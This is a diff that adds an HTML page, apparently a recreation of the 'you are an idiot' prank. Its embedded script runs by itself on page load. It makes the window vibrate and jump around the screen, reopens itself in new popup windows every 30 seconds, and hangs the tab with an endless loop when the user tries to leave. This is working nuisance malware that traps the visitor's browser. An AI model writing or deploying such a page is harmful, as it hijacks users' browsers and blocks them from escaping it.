@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .flash {
+            height: 100%;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <img class="flash" src="flash.gif" alt="idiot">
+    <script>
+        function hang() {
+            let X = 0;
+            while(1) document.title = X++;
+        }
+        window.onbeforeunload = function(){
+        return hang();
+        }
+        var ok = RB(0, 1);
+        if((ok != 1) && (ok != 0)) location.reload();
+        var d = 6;
+        var x;
+        var y;
+        var x1;
+        var y1;
+        var w = 1;
+        function RB(min, max) {
+            return Math.floor(Math.random() * (max - min + 1) + min)
+        }
+        function reproduce(A) {
+            for(let i = 0; i < RB(1, 5); i++) {
+                window.open('illusion.html','','HEIGHT=1,WIDTH=1');
+            }
+        }
+        function move() {
+            let maxX = screen.width - window.outerWidth;
+            let maxY = screen.height - window.outerHeight;
+            x = RB(0, maxX);
+            y = RB(0, maxY);
+            x1 = RB(0, maxX);
+            y1 = RB(0, maxY);
+            if(ok == 0) window.moveTo(x,y);
+        }
+        function vibrate() {
+            window.moveTo((x + RB((0 - (window.outerWidth / d)), (window.outerWidth / d))), (y + RB((0 - (window.outerHeight / d)), (window.outerHeight / d))));
+        }
+        function workplease() {
+            setTimeout(() => {
+                window.moveTo(x,y);
+            }, w)
+            setTimeout(() => {
+                window.moveTo(x1,y1);
+            }, w);
+        }
+        setInterval(vibrate, 1);
+        setInterval(move, 1000);
+        if(ok == 1) {
+            window.width = screen.width;
+            setInterval(workplease, 5)
+        }
+        setInterval(reproduce, 30000);
+    </script>
+</body>
+</html>
